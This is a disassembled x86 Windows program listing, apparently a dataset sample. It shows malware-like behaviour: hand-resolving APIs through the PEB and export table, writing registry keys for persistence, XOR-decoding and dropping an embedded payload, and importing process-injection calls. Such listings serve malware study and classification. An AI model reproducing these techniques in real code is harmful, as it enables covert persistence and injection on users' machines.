jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x36
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov eax [ ebp - 0x294 ]
push eax
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x2a
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3a
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x23
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_407f70
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_407f70
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_407f70
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x26
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_407f70
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
ja rwxdata
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
call sub_407f70
add esp 0x4
lea edx [ ebp - 0x27c ]
push edx
lea eax [ ebp - 0x138 ]
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x264 ]
add edx 0x70
push edx
call sub_407f70
add esp 0x4
mov eax [ ebp - 0x264 ]
add eax 0x70
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x298 ]
mov [ ebp - 0x2b4 ] eax
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
jmp rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
push 0xeb18
mov ecx [ ebp - 0x148 ]
push ecx
call sub_4080a0
add esp 0x8
push 0x0
lea edx [ ebp - 0x550 ]
push edx
push 0xeb18
mov eax [ ebp - 0x148 ]
push eax
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x28c ]
mov edx [ ebp - 0x558 ]
push edx
call [ ebp - 0x13c ]
mov eax [ ebp - 0x144 ]
and eax 0x100
je rwxdata
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov [ ebp - 0x574 ] 0x44
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov eax [ ebp - 0x144 ]
and eax 0x1000
je rwxdata
mov ecx [ ebp - 0x574 ]
sub ecx 0x1
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov [ ebp + edx - 0x300 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx 0x5
mov [ ebp - 0x2d0 ] dx
xor ecx ecx
mov [ ebp - 0x2d0 ] cx
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
lea eax [ ebp - 0x278 ]
push eax
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x55c ]
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_407f70
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x13 ] 0x1
mov [ ebp - 0x12 ] 0x2
mov [ ebp - 0x11 ] 0x10
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xf ] 0x4
mov [ ebp - 0xe ] 0x8
mov [ ebp - 0xd ] 0x8
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0xb ] 0x2
mov [ ebp - 0xa ] 0x20
mov [ ebp - 0x9 ] 0x40
mov [ ebp - 0x8 ] 0x40
mov [ ebp - 0x7 ] 0x20
mov [ ebp - 0x6 ] 0x80
mov [ ebp - 0x5 ] 0x80
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov [ ebp - 0x1c ] 0x0
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x4 ]
jge rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp rwxdata
mov [ ebp - 0x15 ] 0x0
mov [ ebp - 0x20 ] 0x0
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movsx ecx [ eax ]
cmp ecx 0x20
jne rwxdata
cmp [ ebp - 0x20 ] 0x8
jge rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] 0x0
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jle rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov al [ ebp - 0x15 ]
mov [ edx ] al
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
movsx ecx [ eax ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x14 ]
and ecx eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
not eax
and ecx eax
mov [ ebp - 0x24 ] ecx
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
or ecx eax
mov [ ebp - 0x24 ] ecx
jmp rwxdata
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov cl [ ebp - 0x24 ]
mov [ ebp - 0x15 ] cl
jmp rwxdata
sub_4080a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0xc ]
jge rwxdata
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
cmp eax 0x64
jne rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
xor eax 0x80de78ac
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ecx ] al
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0x1 ]
cmp edx 0x7d
jne rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x2 ]
cmp ecx 0x77
jne rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx + 0x6 ]
cmp eax 0x61
jne rwxdata
mov ecx [ ebp - 0x4 ]
add ecx 0x3e4
mov [ ebp - 0x4 ] ecx
sub_408130
push ebp
mov ebp esp
push ecx
mov eax [ fs : 0x30 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_408160
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add eax [ edx + 0x3c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
add edx [ ecx + 0x78 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x18 ]
jae rwxdata
xor eax eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
add ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x24 ] edx
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x25 ] 0x0
je rwxdata
jmp rwxdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov dx [ eax + ecx * 2 ]
mov [ ebp - 0x1c ] dx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
add ecx [ ebp - 0x10 ]
movzx edx [ ebp - 0x1c ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
jmp rwxdata
mov [ ebp - 0x2c ] 0x0
jmp rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax + 0x1 ]
mov [ ebp - 0x26 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx + 0x1 ]
jne rwxdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jne rwxdata
add [ ebp - 0x24 ] 0x2
add [ ebp - 0x20 ] 0x2
cmp [ ebp - 0x26 ] 0x0
jne rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax ]
mov [ ebp - 0x25 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx ]
jne rwxdata
sub_401350
mov eax 0x103
retn 0x4
sub_401460
mov eax [ esp + 0x4 ]
push eax
call [ SetEvent@IAT ]
call [ GetCurrentThreadId@IAT ]
cmp [ rw-data ] eax
je r-xdata
mov eax 0x1
retn 0x4
push 0x103
call [ ExitThread@IAT ]
sub_401490
call [ GetCurrentThreadId@IAT ]
cmp [ rw-data ] eax
je r-xdata
jmp [ DeviceIoControl@IAT ]
cmp [ esp + 0x18 ] 0x0
je r-xdata
mov eax 0x1
retn 0x20
push 0x103
call [ ExitThread@IAT ]
sub_4015b0
xor eax eax
retn 0xc
sub_401e66
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x28 ] ecx
push eax
push ecx
call _XcptFilter
pop ecx
pop ecx
retn
sub_401eb2
xor eax eax
inc eax
retn
sub_401eb6
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov eax 0xff
call sub_4022c1
retn
sub_401fac
call sub_402328
jmp sub_401ced
sub_401ff9
push sub_401fb6
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
_amsg_exit
jmp [ _amsg_exit@IAT ]
sub_4020aa
push 0x8
call _unlock
pop ecx
retn
sub_4020b3
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40200e
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
_XcptFilter
jmp [ _XcptFilter@IAT ]
sub_40223b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
_initterm
jmp [ _initterm@IAT ]
_initterm_e
jmp [ _initterm_e@IAT ]
sub_4022c1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_402325
xor eax eax
retn
?terminate@@YAXXZ
jmp [ terminate@IAT ]
_unlock
jmp [ _unlock@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_lock
jmp [ _lock@IAT ]
sub_4023d6
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_4023f8
retn
_except_handler4_common
jmp [ _except_handler4_common@IAT ]
_invoke_watson
jmp [ _invoke_watson@IAT ]
_controlfp_s
jmp [ _controlfp_s@IAT ]
_crt_debugger_hook
jmp [ _crt_debugger_hook@IAT ]
GetFileVersionInfoW
jmp [ GetFileVersionInfoW@IAT ]
VerQueryValueW
jmp [ VerQueryValueW@IAT ]
GetFileVersionInfoSizeW
jmp [ GetFileVersionInfoSizeW@IAT ]
NtWriteVirtualMemory
jmp [ NtWriteVirtualMemory@IAT ]
NtWaitForSingleObject
jmp [ NtWaitForSingleObject@IAT ]
NtClose
jmp [ NtClose@IAT ]
NtOpenProcess
jmp [ NtOpenProcess@IAT ]
